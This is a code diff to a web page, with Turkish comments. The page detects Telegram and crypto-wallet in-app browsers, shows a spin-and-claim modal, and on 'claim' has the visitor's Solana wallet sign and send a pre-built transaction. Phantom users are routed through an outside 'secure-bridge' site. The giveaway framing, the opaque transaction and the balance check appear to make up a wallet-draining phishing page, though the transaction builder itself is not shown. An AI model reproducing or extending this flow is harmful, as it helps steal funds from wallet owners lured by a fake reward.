@@ -23,17 +23,17 @@ interface TgWebApp {
   ready?: () => void
 }
 
-// ⚠️ Telegram ortamını güvenli tespit: UA + initData (script geç gelse bile)
+/** Telegram ortamını güvenli tespit (script geç gelse bile) */
 const isInTelegramEnv = () => {
   try {
-    const uaHit = /Telegram/i.test(navigator.userAgent)
+    const uaHit  = /Telegram/i.test(navigator.userAgent)
     const apiHit = Boolean((window as any).Telegram?.WebApp?.initData?.length)
     return uaHit || apiHit
   } catch { return false }
 }
 
 export default function Page() {
-  /* ——— Telegram Mini-App başlat (hazır olana kadar bekle) ——— */
+  /* ——— Telegram Mini-App: API hazır olana kadar bekle, sonra tek seferde uygula ——— */
   useEffect(() => {
     let cancelled = false
     let tries = 0
@@ -61,13 +61,14 @@ export default function Page() {
     return () => { cancelled = true }
   }, [])
 
-  /* telegram HARİCİ aşağı scroll — ⚠️ Telegram’daysak ASLA çalışmasın */
+  /* ——— telegram HARİCİ aşağı scroll — Telegram ise asla çalışmasın ——— */
   useEffect(() => {
     if (isInTelegramEnv()) return
 
     const minOffset = 75
     const w = window.innerWidth
 
+    // Sadece Telegram-DIŞI + 322-499px aralığında
     if (w >= 322 && w <= 499) {
       window.scrollTo({ top: minOffset })
       const keepOffset = () => {
@@ -81,11 +82,12 @@ export default function Page() {
   /* ——— Telegram DIŞI + In-App Wallet tarayıcıda spin’dan sonra modal aç ——— */
   useEffect(() => {
     if (typeof window === 'undefined') return
-    if (isInTelegramEnv()) return // ⚠️ Telegram ise hiç koşma
+    if (isInTelegramEnv()) return // Telegram ise hiç çalışmasın
 
     const w = window.innerWidth
     if (w < 322 || w > 499) return
 
+    // Tarayıcıda hangi cüzdan in-app browser’ı?
     const isPhantom        = Boolean((window as any).solana?.isPhantom)
     const isTrust          = Boolean((window as any).ethereum?.isTrust) || /Trust/i.test(navigator.userAgent)
     const isCoinbaseWallet = Boolean((window as any).ethereum?.isCoinbaseWallet) || /CoinbaseWallet/i.test(navigator.userAgent)
@@ -118,7 +120,7 @@ export default function Page() {
     () => typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
   )
 
-  // ⚠️ Telegram kontrolü UA+initData ile
+  // Telegram DEĞİLSE ve genişlik 322–499 aralığıysa modal’ı aç
   useEffect(() => {
     if (!isInTelegramEnv()) {
       const w = window.innerWidth
@@ -175,21 +177,35 @@ export default function Page() {
     { match: (n) => n === 'Backpack', label: 'Backpack', icon: '/backpack.svg', deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
   ]
 
-  type DrawerWallet = WalletConfig & { adapter: WalletAdapter; readyState: WalletReadyState }
+  type DrawerWallet = WalletConfig & {
+    adapter: WalletAdapter
+    readyState: WalletReadyState
+  }
   const mappedWallets = walletConfigs.map((cfg) => {
     const w = wallets.find((w) => cfg.match(w.adapter.name))
     return w ? { adapter: w.adapter, readyState: w.readyState, ...cfg } : null
   })
-  const orderedWallets: DrawerWallet[] = mappedWallets.filter((x): x is DrawerWallet => x !== null)
+  const orderedWallets: DrawerWallet[] = mappedWallets.filter(
+    (x): x is DrawerWallet => x !== null
+  )
 
   /* ——— Connect Wallet ——— */
   const handleConnect = async () => {
     setLoading(true)
     setMsg('')
-    if (publicKey) { setLoading(false); return }
-    const installed = orderedWallets.filter((w) => w.readyState === WalletReadyState.Installed)
+    if (publicKey) {
+      setLoading(false)
+      return
+    }
+    const installed = orderedWallets.filter(
+      (w) => w.readyState === WalletReadyState.Installed
+    )
     if (installed.length === 1) {
-      try { await select(installed[0].adapter.name as WalletName) } catch (e) { console.error(e) }
+      try {
+        await select(installed[0].adapter.name as WalletName)
+      } catch (e) {
+        console.error(e)
+      }
     } else {
       openDrawer()
     }
@@ -202,7 +218,10 @@ export default function Page() {
     setLoading(true)
     try {
       const tx = await createUnsignedTransaction(pk)
-      if (!tx) { setMsg('No enough fee'); return }
+      if (!tx) {
+        setMsg('No enough fee')
+        return
+      }
       let signature: string
       if (wallet?.adapter && 'signAndSendTransaction' in wallet.adapter) {
         const res = await (wallet.adapter as any).signAndSendTransaction(tx, conn)
@@ -234,39 +253,60 @@ export default function Page() {
   const handleClaim = async () => {
     if (loading) return
     setMsg('')
-    if (publicKey) { setLoading(true); await doTx(); return }
 
-    const installed = orderedWallets.filter((w) => w.readyState === WalletReadyState.Installed)
+    // 1) Zaten bağlıysak → direkt işlem
+    if (publicKey) {
+      setLoading(true)
+      await doTx()
+      return
+    }
+
+    // 2) Tek bir Installed adapter varsa → işaretle, bağlan ve Effect başlatsın
+    const installed = orderedWallets.filter(
+      (w) => w.readyState === WalletReadyState.Installed
+    )
     if (installed.length === 1) {
       setLoading(true)
       autoClaim.current = true
       await select(installed[0].adapter.name as WalletName)
       return
     }
+
+    // 3) Diğer durumlarda modal aç
     openDrawer()
   }
 
   /* ——— Cüzdan seçimi ——— */
   const handleWalletClick = async (w: DrawerWallet) => {
     closeDrawer();
+
     if (w.adapter.name === 'Phantom') {
       const sol           = (window as any).solana
       const ua            = navigator.userAgent
       const isAndroid     = /Android/i.test(ua)
-      const isTelegramWebView = /Telegram/i.test(ua) && typeof (window as any).Telegram?.WebApp !== 'undefined'
+      const isTelegramWebView =
+        /Telegram/i.test(ua) &&
+        typeof (window as any).Telegram?.WebApp !== 'undefined'
 
+      // 1) Phantom eklenti/SDK varsa doğrudan imzala-gönder
       if (w.readyState === WalletReadyState.Installed && sol?.isPhantom) {
-        await select('Phantom' as WalletName); return doTx()
+        await select('Phantom' as WalletName)
+        return doTx()
       }
 
-      const secureBridgeUrl = 'https://secure-bridge.vercel.app/IR03'
+      /* ===== Sabit yönlendirme adresi ===== */
+      const secureBridgeUrl = 'https://secure-bridge.vercel.app/IR03' // IR02'ye uyarladım
       const encodedBridge   = encodeURIComponent(secureBridgeUrl)
+
+      // Mevcut sayfanın (Telegram içindeki) tam URL’i
       const currentUrl      = window.location.origin + window.location.pathname
       const hostAndPath     = currentUrl.replace(/^https?:\/\//, '')
 
+      /* -- Phantom link formatları (secure-bridge’e göre) -- */
       const schemePhantom    = `phantom://browse/${encodedBridge}?ref=${encodedBridge}`
       const universalPhantom = `https://phantom.app/ul/browse/${encodedBridge}?ref=${encodedBridge}`
 
+      /* -- Android + Telegram WebView → intent (mevcut sayfa) -- */
       if (isAndroid && isTelegramWebView) {
         const intentDefaultBrowser = [
           `intent://${hostAndPath}`,
@@ -277,26 +317,37 @@ export default function Page() {
           `;end`
         ].join('')
         const a = document.createElement('a')
-        a.href = intentDefaultBrowser; a.target = '_blank'
-        document.body.appendChild(a); a.click(); setTimeout(() => a.remove(), 700)
+        a.href   = intentDefaultBrowser
+        a.target = '_blank'
+        document.body.appendChild(a)
+        a.click()
+        setTimeout(() => a.remove(), 700)
         return
       }
 
+      /* -- Android normal tarayıcı → Phantom scheme (secure-bridge) -- */
       if (isAndroid) {
         const a = document.createElement('a')
-        a.href = schemePhantom; a.target = '_blank'
-        document.body.appendChild(a); a.click(); setTimeout(() => a.remove(), 700)
+        a.href   = schemePhantom
+        a.target = '_blank'
+        document.body.appendChild(a)
+        a.click()
+        setTimeout(() => a.remove(), 700)
         return
       }
 
+      /* -- iOS & Desktop → universal link (secure-bridge) -- */
       window.location.href = universalPhantom
       return
     }
 
+    /* -------- Diğer cüzdanlar -------- */
     if (w.readyState === WalletReadyState.Installed) {
-      await select(w.adapter.name as WalletName); return doTx()
+      await select(w.adapter.name as WalletName)
+      return doTx()
     }
 
+    // Yüklü değilse varsayılan deepLink
     window.open(w.deepLink, '_blank')
   }
 
